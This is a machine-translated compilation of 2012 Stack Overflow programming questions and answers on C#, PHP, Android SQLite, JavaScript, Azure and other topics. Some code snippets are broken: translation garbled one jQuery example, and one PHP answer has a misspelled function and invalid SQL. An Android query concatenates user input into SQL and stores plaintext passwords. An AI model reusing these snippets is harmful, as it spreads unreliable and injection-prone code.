我试着正常做，但它一直告诉我它需要在 = 或 += 的另一边。我该如何解决？

我使用的代码是： browser.Document.GetElementById("ap_h").Click;

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-06-30T09:46:34.500

您正在寻找的代码是：

**在 DOM-Element 中调用方法**

```
// The WebBrowser control
System.Windows.Forms.WebBrowser webBrowser;

// Perform a click on an element
HtmlDocument document = webBrowser.Document;
document.GetElementById("id_of_element").InvokeMember("Click"); 
```

上面的代码为您执行 WebBrowser 控件中的单击。

* * *

**分配事件处理程序**

如果要分配事件处理程序：

```
document.GetElementById("id_of_element").Click 
                             += new HtmlElementEventHandler(el_Click); 
```

和：

```
void el_Click(object sender, HtmlElementEventArgs e)
{
     // Do something
} 
```

# python - 构建下载的python包后如何处理test/docs/readme文件？

> ID：11271883
> 
> 赞同：1
> 
> 时间：2012-06-30T06:05:07.060
> 
> 标签：python, macos, packages, egg, file-management

抱歉这个问题很抱歉，但是，当我下载并解压缩第三方 python 包，然后**python setup.py 安装**它从而在站点包中创建一个 egg 目录时，我该如何处理下载中的原始解压缩目录文件夹？我应该 sudo 复制并粘贴所有 test/docs/README 文件以及其余相应的站点包文件吗？我通常会删除它们，但不认为这是明智之举。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-30T11:29:59.327

如果您只想使用已安装的 Python 包，那么您根本不需要下载的目录。如果您愿意，可以将其删除。如果您想将它用于它的文档，那么您可以保留它，或者将它移到其他地方。已安装的软件包与您安装的原始解压缩目录之间没有任何联系，因此您可以随意使用它。

# debugging - 在 Azure 中调试辅助角色时出错

> ID：11271884
> 
> 赞同：1
> 
> 时间：2012-06-30T06:05:13.753
> 
> 标签：debugging, azure, role, worker

在尝试调试工作角色时突然开始出现以下错误：

“用于 Microsoft Visual Studio 的 Windows Azure 工具

将调试器附加到角色实例“deployment16(360)blah blah”时出错，进程 ID：“8780”。无法附加。Microsoft Visual Studio 远程调试监视器已在远程计算机上关闭。”

重新启动 Visual Studio 和机器没有帮助。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-30T18:46:34.083

当你在你的开发机器上突然开始遇到这个问题时，一定有一些东西发生了变化，这主要是由于你在机器上安装的一些操作系统自动更新和/或一些应用程序更新。此问题可能有任何随机原因，但是如果我遇到完全相同的问题，我会采取以下措施来解决此类问题：

1.  首先，首先通过从 web/worker 模板创建基础应用程序来检查它不是特定于应用程序的问题，并查看是否存在问题。
2.  如果您安装了新版本的 Windows Azure SDK 1.7，请检查 SDK 1.6 和 1.7 是否都出现问题。
3.  检查您是否可以在 Compute Emulator 之外调试基于 IIS 的应用程序。如果问题特定于 Windows Azure 开发结构或绑定到您的 IIS 本身，这将隔离。
4.  如果这是 IIS 特定问题，请检查所有启用的功能的 IIS 配置，尝试重置应用程序池配置，运行“ASPnet_regiis -i”等来解决问题。
5.  如果是 Windows Azure Computer Emulator 特定的，我知道有时操作系统更新可能会使应用程序不稳定，所以在这种情况下，我将分别重新安装 .net 4.0 和 VS2010 SP1。（这确实有很多帮助）然后完全重新安装 Azure SDK 1.7。

此类随机问题主要是由于您的机器配置发生了一些变化，因此恢复 VS2010 并重新安装所有其他应用程序确实有助于解决问题。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-09T22:30:10.397

如果您在角色中遇到异常`OnStart()`或`Application_Start()`调试器未启动，您也可能会收到此消息。 `Application_Start()`错误尤其有害，因为调试器在此方法返回之前不会附加到 Web 进程。

如果你拘泥于RoleEnvironment等云特定类，无法将web角色设为启动项目，可以直接使用Ctrl-F5运行云项目，无需调试。运气好的话，你会得到一个黄色的死机屏幕来告诉你真正的错误。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-01T14:07:44.163

Avkash 涵盖了要点。

我最近有同样的问题。我将我的 web 项目设置为启动而不是 Azure，我发现该 web 项目实际上并没有运行。当我的项目为 X64 编译时，结果不知何故。我改变了它并且它起作用了。

# magento - 控制器 URL 删除

> ID：11271885
> 
> 赞同：0
> 
> 时间：2012-06-30T06:05:26.150
> 
> 标签：magento

我正在尝试删除浏览器地址栏中的 magento 控制器 url。

例如我的网站有 URL **WWW.test.com/** - 这个页面是我网站的主页。但是我已经重定向到客户登录的登录页面。一旦用户键入 www.test.com 站点将被重定向到**WWW.test.com/customer/account/login**显示登录页面。

因此，出于 Seo 的目的，我尝试将“ **WWW.test.com/** ”设置为带有父 URL ( **WW.test.com/** ) 的登录内容。我尝试了所有使用**ht access**的方法。但不反映。

谁能给我更好的解决方案来解决这个问题

（抱歉英语不好）谢谢大家

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-30T20:22:32.550

最简单的方法是将登录表单 HTML 插入您的 CMS 页面。

# security - 业务逻辑与表示逻辑的分离是否会增加安全性？

> ID：11271886
> 
> 赞同：0
> 
> 时间：2012-06-30T06:06:00.360
> 
> 标签：security, jsp, servlets

我们可以在jsp中将业务逻辑与表示逻辑分开。如果我们使用servlet，它有助于在html环​​境中编写java代码，然后我们需要在out.write()中编写html标签多次。在哪些情况下无法结合业务逻辑和表示逻辑？为什么它会降低安全性？

# eclipse - Eclipse 的添加新包选项消失了

> ID：11271888
> 
> 赞同：2
> 
> 时间：2012-06-30T06:06:08.467
> 
> 标签：eclipse

在我的项目中，我想添加一个新包，但意识到该选项消失了。相反，如果我转到文件，我看到了“JPA 项目”、“企业应用程序项目”、“动态 Web 项目”等。有人知道如何解决这个问题吗？谢谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-30T08:00:58.193

您在“File -> New”下看到的选项取决于当前打开的 Eclipse 透视图。您可能正在查看“Java EE”透视图，并且您可能更熟悉标准 Java 透视图，您可以从 Window -> Open Perspective -> Java 打开它。

您还可以通过以下方式从 Java EE 透视图创建包：文件 -> 新建 -> 其他... -> 包。

# c++ - 全局变量“count”不明确

> ID：11271889
> 
> 赞同：27
> 
> 时间：2012-06-30T06:06:13.630
> 
> 标签：c++, variables, global

```
#include <algorithm>
using namespace std;

int count = 0, cache[50];

int f(int n)
{  
    if(n == 2) count++;
    if(n == 0 || n==1) return n;
    else if (cache[n] !=- 1) return cache[n];
    else cache[n]= f(n-1) + f(n-2);
    return cache[n]; 
} 
```

我在 gcc 4.3.4 中使用了这个函数，得到了以下错误：

```
prog.cpp: In function ‘int f(int)’:
prog.cpp:38: error: reference to ‘count’ is ambiguous 
```

在我的本地机器（mingw32）上，我得到的错误是[这个](http://picturepush.com/public/8610702)，虽然它不是针对`int 'cache[]'`.

有什么理由吗？

* * *

## 回答 #1

> 赞同：82
> 
> 时间：2012-06-30T06:20:55.770

问题都是因为这里的第二行：

```
#include <algorithm>
using namespace std; 
```

该行`using namespace std`带来了所有名称，`<algorithm>`其中还有一个名为 的函数`count`，并且在您的代码中，您已经声明了一个变量`count`。因此，模棱两可的错误。

解决方案是**永远不要**写`using namespace std`. 很糟糕很糟糕。

相反，请在您的代码中使用`std::cout`、`std::cin`、`std::endl`等。`std::count`

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2020-10-29T05:56:38.817

I think I may have figured this out. I have found that removing the `using namespace std` doesn't help, but when I change the name of the variable to something which is less common, like count can be changed to `cnt` or some personal versions like `knt` or `isCycle`. I don't exactly know what is the reason behind this.

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2020-11-12T18:06:38.173

yeah idk but changing the name to less common variable name works fine in case of mine

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2021-11-06T09:02:50.427

simply change the variable name as it 'count' matches the internal keyword while we declare using namespace std.

# php - 公共方法中无法访问的公共属性

> ID：11271892
> 
> 赞同：0
> 
> 时间：2012-06-30T06:06:24.663
> 
> 标签：php, oop

我对 Php OOP 非常陌生，并且陷入了一个特定问题。我已经搜寻了stackoverflow以尝试找到答案，但不能。我在这个问题上花了一个多小时，准备放弃了。我知道 Php 大师会立即看到我的问题，所以请告诉我为什么这门课不起作用。

```
 <?php
class tester{
    public $testproperty;
    public function testfunction(){
        $this->$testproperty = 'Nothing';
        return $this->$testproperty;
    }
}
$object = new tester();
echo $object->testfunction();
?> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-30T06:13:28.953

```
$this->testproperty; //without $ 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-30T06:13:28.913

改变

```
$this->$testproperty 
```

至

```
$this->testproperty 
```

始终首先阅读有关该主题的手册。

# php - 会话是保持还是销毁？

> ID：11271897
> 
> 赞同：1
> 
> 时间：2012-06-30T06:07:18.770
> 
> 标签：php

我对 PHP 中的 Session 感到困惑。我的问题是当用户直接关闭红十字按钮而不注销会话是否被破坏时。如果他再次打开该页面，他会被要求登录还是会被引导进入应用程序？

我已经用谷歌搜索了，有人说它将被定向到登录，同样的人说它将被定向到应用程序内部。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-30T06:27:34.907

默认会话*cookie*设置为在浏览器窗口关闭时过期。服务器上对应的会话还会存在一段时间，直到被垃圾回收。如果用户可以复活/保留cookie，他可以继续使用会话。但同样，浏览器在关闭时会丢弃 cookie。您可以使用明确的到期时间修改会话 cookie 设置，这意味着它将一直持续到那时，为您的用户提供永久登录状态。

以下是您可以调整的所有会话和会话 cookie 相关设置：http [`ini_set`](http://php.net/ini_set): [//php.net/manual/en/session.configuration.php](http://php.net/manual/en/session.configuration.php)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-30T06:10:51.713

如果您不修改会话 Cookie 的到期时间，则 PHP 会话应在浏览器窗口关闭时自动到期。

此外，您描述的任何场景都可以通过[`Cookie`](https://developer.mozilla.org/en/DOM/document.cookie)

如果您在有限的时间段内设置 cookie（持久性），那么在此之前它不会要求登录并保存您的登录凭据。

在最后一页上重定向可以通过您的逻辑而不是浏览器来完成。

`session.cookie_lifetime`在**php.ini**中检查 它是否为**0**意味着每当我们关闭浏览器时。它将破坏会话

**[`more info`](https://stackoverflow.com/questions/2839988/php-how-to-destroy-or-unset-session-when-user-close-the-browser-without-clicki)**

# javascript - 如何在本地保存网页，包括图片等

> ID：11271898
> 
> 赞同：6
> 
> 时间：2012-06-30T06:07:22.387
> 
> 标签：javascript, firefox, firefox-addon, webpage, xpcom

我正在为应用程序构建一个附加组件。客户付费查看一些网页并从中下载一些文件。他们想通过插件自动化这个下载过程。因此，无需选择“将页面另存为”并等待下载完成，他们可以单击加载项并忘记该过程。问题是，网页正在向浏览器提供一些 cookie。所以最好的方法是 File-> "Save Page As" 。我想通过插件来做到这一点。有没有什么firefox-javascript方法呢？我使用了 nsiDownloader。但它只保存html，而不是图片等。有人可以指导我解决这个问题吗？

**编辑：** 嗨，这是成功的代码，感谢 sai prasad

```
var dir =Components.classes["@mozilla.org/file/local;1"]  
       .createInstance(Components.interfaces.nsILocalFile); 
dir.initWithPath("C:\\filename");
var file = Components.classes["@mozilla.org/file/local;1"]  
       .createInstance(Components.interfaces.nsILocalFile);  
file.initWithPath("C:\\filename.html");  
var wbp = Components.classes['@mozilla.org/embedding/browser/nsWebBrowserPersist;1']  
          .createInstance(Components.interfaces.nsIWebBrowserPersist);  
alert("going to save");
wbp.saveDocument(content.document, file,dir, null, null, null);  
alert("saved"); 
```

**编辑：** 但是，仍然有些网页没有完全保存为“将页面另存为”。这些保存的页面不会像原始页面那样呈现，它们看起来像一些 html 示例。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-06-30T13:53:28.393

由于您提到文件->“另存为”按预期工作，我尝试查看源代码（chrome://browser/content/browser.xul）并发现：

[https://developer.mozilla.org/en/nsIWebBrowserPersist#saveDocument()](https://developer.mozilla.org/en/nsIWebBrowserPersist#saveDocument%28%29)

确保只有在网页完全加载（而不是 DOMContentLoaded）后才调用此函数！！

# php - PHP：获取目录中文件数量的最有效方法

> ID：11271907
> 
> 赞同：3
> 
> 时间：2012-06-30T06:08:52.403
> 
> 标签：php

考虑这两个文件夹结构：

```
Foo/
    Folder1/
        File1.txt
    Folder2/
    Folder3/
    File2.txt

Bar/
    Folder1/
        Folder2/
    Folder3/
    Folder4/ 
```

我想知道 PHP 中最有效的方法来告诉我“Foo”文件夹中有两个文件，而“Bar”文件夹中有零个文件。注意它是递归的。即使“File1.txt”文件不在*“* Foo”文件夹内，我仍然希望它计数。另外，我不在乎文件的名称是什么。我只想要文件总数。

任何帮助，将不胜感激。谢谢！

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-06-30T06:14:00.687

使用`RecursiveDirectoryIterator`. 这是[文档](http://php.net/manual/en/class.recursivedirectoryiterator.php)。

```
$rdi = new RecursiveIteratorIterator(new RecursiveDirectoryIterator('/home/thrustmaster/Temp', FilesystemIterator::SKIP_DOTS), RecursiveIteratorIterator::LEAVES_ONLY);

foreach ($rdi as $file)
    echo "$file\n";
print iterator_count($rdi); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-06-30T06:23:01.607

您需要一个递归函数来循环遍历目录结构。这就是在不使用面向对象的解决方案的情况下计算文件数量的所有方法。

此函数将递归计算目录及其子目录中的文件数。

```
function countDir($dir, $i = 0) {
    if ($handle = opendir($dir.'/')) {
        while (false !== ($file = readdir($handle))) {

            // Check for hidden files the array[0] on a 
            // string returns the first character
            if ($file[0] != '.') {
                if (is_dir($dir.'/'.$file)) {
                    $i += countDir($dir.$file, $i);
                } else {
                    $i++;
                }
            }
        }
    }

    return $i;
} 
```

# php - 从 MySQL 中提取数据用于 Feed

> ID：11271911
> 
> 赞同：0
> 
> 时间：2012-06-30T06:09:58.220
> 
> 标签：php, mysql

我有一个人们生成内容的网站。我的数据库有一个名为 _conv 的表，里面有几个字段，包括名称、文本等。

我如何编写一个简单的 php 脚本来提取该数据并将其显示为网页上的提要？如果有人可以给我一些提示或链接来帮助我做到这一点，那就太棒了。

我的程序员设计了这个网站，但如果给出正确的方向，我可以很容易地弄清楚这一点。

这就像说我桌子上的最后 10 个提交，它会像提要一样向下显示。

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-30T06:17:34.613

你需要`SELECT`从表中使用

*   ORDER BY autoincrementfield DESC（如果您的主键是 INT / BIGINT / MEDIUMINT / ... 并设置为 auto_increment）
*   ORDER BY insertdatefield DESC（否则您需要一个带有插入条目日期的字段 - 在这种情况下订购）

在`ORDER BY`你应该`LIMIT 10`结果之后。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-30T06:37:51.043

```
$query = mysql_query("SELECT * FROM table_name ORDER BY DESC LIMIT 10");
if(mysql_mun_rows($query) == 1){
$result = mysql_fetch_assoc($query);
// and then you can fetch data 
$name = $result['NAME'];
$text= $result['TEXT'];

} 
```

# android - Android SQLite 数据库不适用于高于 Android 2.1 的版本

> ID：11271912
> 
> 赞同：0
> 
> 时间：2012-06-30T06:10:09.883
> 
> 标签：android

我目前正在开发一个包含 SQLite 数据库的 android 应用程序。我正在尝试使用 Android 2.1 的模拟器，它工作正常..但它不适用于比 Android 2.1 更新的版本 ....在我的应用程序中，我在 SQLite 管理器上创建了一个外部 SQLite 数据库，然后我在第一次启动应用程序时将此数据库复制到“/data/data/”+ getPackageName()+“/databases/MyDB”。
从资产文件夹复制数据库的代码：

```
try{

                try {           
                    String destPath = "/data/data/" + getPackageName() + "/databases/MyDB";
                    File f = new File(destPath);            
                    if (!f.exists()) {          
                        CopyDB( getBaseContext().getAssets().open("mydb"), 
                            new FileOutputStream(destPath));
                    }
                } catch (FileNotFoundException e) {         
                    e.printStackTrace(); 
```

复制数据库功能：

```
public void CopyDB(InputStream inputStream, OutputStream outputStream) 
        throws IOException {
            //---copy 1K bytes at a time---
            byte[] buffer = new byte[1024];
            int length;
            while ((length = inputStream.read(buffer)) > 0) {
                outputStream.write(buffer, 0, length);
            }
            outputStream.flush();
            inputStream.close();
            outputStream.close();
        } 
```

DBAdapter 类：

```
public class DBAdapter {
public static final String KEY_ROWID = "_id";
public static final String KEY_NAME = "username";
public static final String KEY_PASSWORD = "password";

private static final String DATABASE_NAME = "MyDB";
private static final String DATABASE_TABLE = "users";
private static final int DATABASE_VERSION = 3;

private final Context context;    

private DatabaseHelper DBHelper;
private SQLiteDatabase db;

public DBAdapter(Context ctx) 
{
    this.context = ctx;
    DBHelper = new DatabaseHelper(context);
}

private static class DatabaseHelper extends SQLiteOpenHelper 
{
    DatabaseHelper(Context context) 
    {
        super(context, DATABASE_NAME, null, DATABASE_VERSION);
    }

    @Override
    public void onCreate(SQLiteDatabase db) 
    {

    }

    @Override
    public void onUpgrade(SQLiteDatabase db, int oldVersion, int newVersion) 
    {

    }
}    

//---opens the database---
public DBAdapter open() throws SQLException 
{
    db = DBHelper.getWritableDatabase();
    return this;
}

//---closes the database---    
public void close() 
{
    DBHelper.close();
}

//---retrieves all the users---
public Cursor getAllusers() 
{
    return db.query(DATABASE_TABLE, new String[] {KEY_ROWID, KEY_NAME,
            KEY_PASSWORD}, null, null, null, null, null);
}

//---retrieves a particular user---
public User getuser(String username) throws SQLException 
{

    Cursor mCursor =
            db.query(true, DATABASE_TABLE, new String[] {KEY_ROWID,
            KEY_NAME, KEY_PASSWORD}, KEY_NAME + "=" + "'"+username+ "'", null,
            null, null, null, null);
    if(mCursor.moveToFirst())
    {
        mCursor.moveToFirst();
        User u=new User(Integer.valueOf(mCursor.getString(0)),mCursor.getString(1),mCursor.getString(2));
        return u;
    }else
        return null;

}

public List<Device> getNotupdatedDevices() {
    List<Device> Devices = new ArrayList<Device>();

    SQLiteDatabase db = DBHelper.getWritableDatabase();
    Cursor myCursor =
            db.query("Devices", new String[] {"_DeviceID","current_state","current_level","current_CD_Channel" }, "updated=?", new String[] {"false"}, null, null, null);

    if (myCursor.moveToFirst()) {
        do {
            Device d = new Device(Integer.valueOf(myCursor.getString(0)), myCursor.getString(1),Integer.valueOf(myCursor.getString(2)), Float.valueOf(myCursor.getString(3)));

            Devices.add(d);
        } while (myCursor.moveToNext());
        return Devices;
    }

    return null;

    }

public Device getDevice(String DeviceType,String RoomType,int floor) throws SQLException 
{
    Cursor mCursor =
          db.query("Rooms", new String[] {"_RoomID" }, "RoomType=? AND floor=?", new String[] {RoomType, floor+""}, null, null, null);

    if(mCursor.moveToFirst())
    {
        mCursor.moveToFirst();

        int id=Integer.valueOf(mCursor.getString(0));
        Cursor myCursor =
                db.query("Devices", new String[] {"current_state","current_level","current_CD_Channel" }, "DeviceType=? AND RoomID=?", new String[] {DeviceType, id+""}, null, null, null);

        if(myCursor.moveToFirst())
        {
            myCursor.moveToFirst();     
            Device d=new Device(DeviceType,floor,RoomType,myCursor.getString(0), Integer.valueOf(myCursor.getString(1)),Float.valueOf(myCursor.getString(2)));
            return d;
        }else 
            return null;
    }else
        return null;

}

public void updateDevice(int floor, String RoomType, String DeviceType, String current_state,int current_level,float current_CD_Channel  ) {
    SQLiteDatabase db = DBHelper.getWritableDatabase();

    Cursor mCursor =
            db.query("Rooms", new String[] {"_RoomID" }, "RoomType=? AND floor=?", new String[] {RoomType, floor+""}, null, null, null);

        mCursor.moveToFirst();

        int id=Integer.valueOf(mCursor.getString(0));

    ContentValues values = new ContentValues();
    values.put("current_state", current_state);
    values.put("current_level", current_level);
    values.put("current_CD_Channel", current_CD_Channel);
    values.put("updated", "false");

    db.update("Devices", values, "RoomID= ? AND DeviceType=?",new String[] { String.valueOf(id),DeviceType  });

    db.close();
}

public void SyncDevice(int id, String current_state,int current_level,float current_CD_Channel  ) {
    SQLiteDatabase db = DBHelper.getWritableDatabase();

    ContentValues values = new ContentValues();
    values.put("current_state", current_state);
    values.put("current_level", current_level);
    values.put("current_CD_Channel", current_CD_Channel);
    values.put("updated", "true");

    // updating row
    db.update("Devices", values, "_DeviceID= ?", new String[] { String.valueOf(id) });
    db.close();
} 
```

}

在冰淇淋三明治模拟器上运行应用程序时的 logcat 消息：

```
 06-26 22:59:29.418: E/AndroidRuntime(6230): FATAL EXCEPTION: main

06-26 22:59:29.418: E/AndroidRuntime(6230): android.database.sqlite.SQLiteException: no such table: users: , while compiling: SELECT DISTINCT _id, username, password FROM users WHERE username='aya'

06-26 22:59:29.418: E/AndroidRuntime(6230):     at android.database.sqlite.SQLiteCompiledSql.native_compile(Native Method)

06-26 22:59:29.418: E/AndroidRuntime(6230):     at android.database.sqlite.SQLiteCompiledSql.<init>(SQLiteCompiledSql.java:68)

06-26 22:59:29.418: E/AndroidRuntime(6230):     at android.database.sqlite.SQLiteProgram.compileSql(SQLiteProgram.java:143)

06-26 22:59:29.418: E/AndroidRuntime(6230):     at android.database.sqlite.SQLiteProgram.compileAndbindAllArgs(SQLiteProgram.java:361)

06-26 22:59:29.418: E/AndroidRuntime(6230):     at android.database.sqlite.SQLiteProgram.<init>(SQLiteProgram.java:127)

06-26 22:59:29.418: E/AndroidRuntime(6230):     at android.database.sqlite.SQLiteProgram.<init>(SQLiteProgram.java:94)

06-26 22:59:29.418: E/AndroidRuntime(6230):     at android.database.sqlite.SQLiteQuery.<init>(SQLiteQuery.java:53)

06-26 22:59:29.418: E/AndroidRuntime(6230):     at android.database.sqlite.SQLiteDirectCursorDriver.query(SQLiteDirectCursorDriver.java:47)

06-26 22:59:29.418: E/AndroidRuntime(6230):     at android.database.sqlite.SQLiteDatabase.rawQueryWithFactory(SQLiteDatabase.java:1564)

06-26 22:59:29.418: E/AndroidRuntime(6230):     at android.database.sqlite.SQLiteDatabase.queryWithFactory(SQLiteDatabase.java:1449)

06-26 22:59:29.418: E/AndroidRuntime(6230):     at android.database.sqlite.SQLiteDatabase.query(SQLiteDatabase.java:1405)

06-26 22:59:29.418: E/AndroidRuntime(6230):     at cse.HomeAutomation.DBAdapter.getuser(DBAdapter.java:79)

06-26 22:59:29.418: E/AndroidRuntime(6230):     at cse.HomeAutomation.Login$1.onClick(Login.java:53)

06-26 22:59:29.418: E/AndroidRuntime(6230):     at android.view.View.performClick(View.java:3511)

06-26 22:59:29.418: E/AndroidRuntime(6230):     at android.view.View$PerformClick.run(View.java:14105)

06-26 22:59:29.418: E/AndroidRuntime(6230):     at android.os.Handler.handleCallback(Handler.java:605)

06-26 22:59:29.418: E/AndroidRuntime(6230):     at android.os.Handler.dispatchMessage(Handler.java:92)

06-26 22:59:29.418: E/AndroidRuntime(6230):     at android.os.Looper.loop(Looper.java:137)

06-26 22:59:29.418: E/AndroidRuntime(6230):     at android.app.ActivityThread.main(ActivityThread.java:4424)

06-26 22:59:29.418: E/AndroidRuntime(6230):     at java.lang.reflect.Method.invokeNative(Native Method)

06-26 22:59:29.418: E/AndroidRuntime(6230):     at java.lang.reflect.Method.invoke(Method.java:511)
06-26 22:59:29.418: E/AndroidRuntime(6230):     at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:784)

06-26 22:59:29.418: E/AndroidRuntime(6230):     at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:551)

06-26 22:59:29.418: E/AndroidRuntime(6230):     at dalvik.system.NativeStart.main(Native Method) 
```

我进行了很多搜索，但没有找到解决这个问题的方法......提前非常感谢你:)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-30T11:30:52.340

你有一个复制数据库的功能，但你没有显示你从*哪里*调用它......这可能会影响结果。我通常在我的 db 助手类的构造函数中调用这样的东西（它也都包含在其中）。

**编辑**

完整示例

```
public class DBAdapter {
    // DB info
    public static final String MAIN_DATABASE_NAME = "Bowers";
    public static final int MAIN_DATABASE_VERSION = 1;
    public static String MAIN_DB_PATH = "/data/data/cdc.workshopapps.BowersMfgHelper/databases/";

    // static strings removed for brevity

    // database control variables
    private DatabaseHelper mDbHelper;
    private static SQLiteDatabase mDb;
    private static Context mCtx;

    private static class DatabaseHelper extends SQLiteOpenHelper {
        DatabaseHelper(Context context, String dbname, int dbversion) {
            super(context, dbname, null, dbversion);
            if (checkDataBase(dbname)) {
                openDataBase(dbname);
            } else {
                try {
                    this.getReadableDatabase();
                    copyDataBase(dbname);
                    this.close();
                    openDataBase(dbname);
                } catch (IOException e) {
                    throw new Error("Error copying database");
                }
                Toast.makeText(context,
                        "Initial " + dbname + " database has been created",
                        Toast.LENGTH_LONG).show();
            }
        }
        @Override
        public void onCreate(SQLiteDatabase db) {
        }
        @Override
        public void onUpgrade(SQLiteDatabase db, int oldVersion, int newVersion) {
        }
    }
    public DBAdapter(Context ctx) {
        DBAdapter.mCtx = ctx;
    }
    public DBAdapter open(String dbname, int dbversion) throws SQLException {
        mDbHelper = new DatabaseHelper(mCtx, dbname, dbversion);
        mDb = mDbHelper.getWritableDatabase();
        return this;
    }
    public void close() {
        mDbHelper.close();
    }
    private static void copyDataBase(String dbname) throws IOException {
        InputStream myInput = mCtx.getAssets().open(dbname);
        String outFileName = MAIN_DB_PATH + dbname;
        OutputStream myOutput = new FileOutputStream(outFileName);
        byte[] buffer = new byte[1024];
        int length;
        while ((length = myInput.read(buffer)) > 0) {
            myOutput.write(buffer, 0, length);
        }
        myOutput.flush();
        myOutput.close();
        myInput.close();
    }
    private static boolean checkDataBase(String dbname) {
        SQLiteDatabase checkDB = null;
        boolean exist = false;
        try {
            String db = MAIN_DB_PATH + dbname;
            checkDB = SQLiteDatabase.openDatabase(db, null,
                    SQLiteDatabase.OPEN_READONLY);
        } catch (SQLiteException e) {
            Log.v("db log", "database does't exist");
        }
        if (checkDB != null) {
            exist = true;
            checkDB.close();
        }
        return exist;
    }
    private static void openDataBase(String dbname) throws SQLException {
        String dbPath = MAIN_DB_PATH + dbname;
        mDb = SQLiteDatabase.openDatabase(dbPath, null,
                SQLiteDatabase.OPEN_READWRITE);
    }
    // insert, update, delete and cursor methods follow, removed for brevity
} 
```

我已经用这个直到Android 3.2 ...

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-30T06:14:43.443

*   android.database.sqlite.SQLiteException: **no such table: users:** , while compile: SELECT DISTINCT _id, username, password FROM u

您尚未创建表

```
@Override
        public void onCreate(SQLiteDatabase db) 
        {

        } 
```

应该

[http://www.vogella.com/articles/AndroidSQLite/article.html](http://www.vogella.com/articles/AndroidSQLite/article.html)

```
// Database creation sql statement
    private static final String DATABASE_CREATE = "create table "
            + TABLE_COMMENTS + "(" + COLUMN_ID
            + " integer primary key autoincrement, " + COLUMN_COMMENT
            + " text not null);";

    public MySQLiteHelper(Context context) {
        super(context, DATABASE_NAME, null, DATABASE_VERSION);
    }

    @Override
    public void onCreate(SQLiteDatabase database) {
        database.execSQL(DATABASE_CREATE);//<--------------------
    } 
```

# javascript - 在浏览器关闭前卸载 - 如何查找用户是否选择了“留下”或“离开”

> ID：11271919
> 
> 赞同：1
> 
> 时间：2012-06-30T06:12:30.967
> 
> 标签：javascript, jquery, html, javascript-events

为了让事情变得非常简单 - 我有以下代码

```
$(window).bind("beforeunload",function(event) {
    返回 '​​';
})

```

至少在 Chrome、FireFox 和 IE9 上 - 当用户关闭浏览器时 - 他会看到两个选项 - “留在页面上”或“离开此页面”（消息因浏览器而异）

现在我怎样才能找出用户选择的选项为了简单起见 - 可以说 - 我想根据用户选择的选项显示额外的消息

类似的东西 - 只是为了给出一个想法

```
if(option=="留在页面上")
   alert("感谢您继续入住");
if(option=="离开此页面")
   alert("很抱歉你决定离开 - 请尽快回来");

```

如何捕获 - 用户选择的内容。非常感谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-30T06:14:33.150

据我所知，出于安全原因，您不允许这样做。您唯一可以做的就是以下内容：

```
window.onbeforeunload = function(){
    return 'Your confirmation message';
} 
```

# c# - 是否可以在 C# 中覆盖构造函数？

> ID：11271920
> 
> 赞同：40
> 
> 时间：2012-06-30T06:12:44.610
> 
> 标签：c#, oop, constructor

是否可以在派生类中重写基类的构造函数？

如果是这样，它是如何实现的，在什么用例中这将是实用的？如果不是，为什么不呢？

* * *

## 回答 #1

> 赞同：54
> 
> 时间：2012-06-30T06:15:38.710

不，您不能覆盖构造函数。这个概念在 C# 中没有意义，因为构造函数根本不会被多态调用。你总是说明你试图构造哪个类，以及构造函数的参数。

构造函数根本不被继承——但是派生类的所有构造函数都必须链接到同一类中的另一个构造函数，或者链接到基类中的一个构造函数。如果您不显式执行此操作，编译器会隐式链接到基类的无参数构造函数（如果该构造函数不存在或不可访问，则会发生错误）。

* * *

## 回答 #2

> 赞同：16
> 
> 时间：2012-06-30T06:19:47.150

不，构造函数不是继承的。您不能在派生类中覆盖它们。
**原因**

> 对于从 object 派生的每个类，将始终调用基本构造函数，因为每个类必须至少有一个调用 base() 构造函数（显式或隐式）的构造函数，并且每次调用 this() 构造函数最终都必须调用一个base() 构造函数。

* * *

## 回答 #3

> 赞同：8
> 
> 时间：2012-06-30T06:23:46.730

不，您不能覆盖构造函数。

如果您查看构造函数的基本语法，它应该与您编写它的类具有相同的名称。

比方说，你写了一个与基类同名的方法（与基类构造函数相同），它只是派生类中的一个新方法，没有指定返回类型，这在语法上是不正确的。

# xpages - 在框架集中打开 XPage 文档

> ID：11271924
> 
> 赞同：0
> 
> 时间：2012-06-30T06:13:05.420
> 
> 标签：xpages, frameset

场景，计划代理通过电子邮件通知向用户发送有关需要用户操作的文档的文档链接。

单击电子邮件中的链接后，我希望该链接可以在框架集中打开 Xpage 文档。

我尝试了以下网址，但无济于事。

[http://www.mywebsite.com/mydb.nsf/myframe?Openframeset&Frame=ContentPH&Src=/mydb.nsf/Document.xsp?documentID=xxxxxxxx&action=readDocument](http://www.mywebsite.com/mydb.nsf/myframe?Openframeset&Frame=ContentPH&Src=/mydb.nsf/Document.xsp?documentID=xxxxxxxx&action=readDocument)

我希望文档打开的框架是 ContentPH 框架。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-02T21:18:29.617

我认为您应该对将在框架集中显示的 url 进行编码。你有吗？在您的网址中输入两次，您的浏览器将在那里将其切断。

尝试这个：

